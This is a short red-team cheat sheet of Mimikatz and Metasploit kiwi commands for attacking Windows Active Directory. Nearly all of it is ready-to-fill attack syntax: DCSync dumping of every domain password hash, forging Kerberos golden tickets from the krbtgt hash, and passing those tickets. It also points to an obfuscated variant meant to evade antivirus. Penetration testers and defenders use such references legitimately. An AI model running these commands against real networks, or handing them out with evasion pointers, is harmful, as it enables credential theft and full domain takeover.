# Using Mimikatz

## Using kiwi with metasploit
```cheat kiwi Get hash as domain admin
dsync_ntlm <domain>\\<user>
```

```cheat kiwi Create golden ticket (this will be base64 encoded)
golden_ticket_create -d <domain> -k <krbtgt hash> -s <domain-sid> -u <name, does not have to exist (but can)> -t <filename>
```

```cheat kiwi  Use golden ticket
kerberos_ticket_use <filename>
```

## Using mimikatz under Windows
```cheat mimikatz Dump domain hashes
log
lsadump::dcsync /domain:<domain> /all /csv
```

```cheat mimikatz Create golden ticket
kerberos::golden /user:<name> /domain: <domain> /sid:<domain-sid>  /krbtgt:<krbtgt hash> /ticket:<filename> /groups:<comma seperated groups this 'virtual' user is part of
```

```cheat mimikatz Use golden ticket
kerberos::ptt <filename>
```

## obfuscated versions to avoid av

* https://github.com/DanMcInerney/Invoke-Cats

tags: windows redteam pentest metasploit kiwi mimikatz privesc
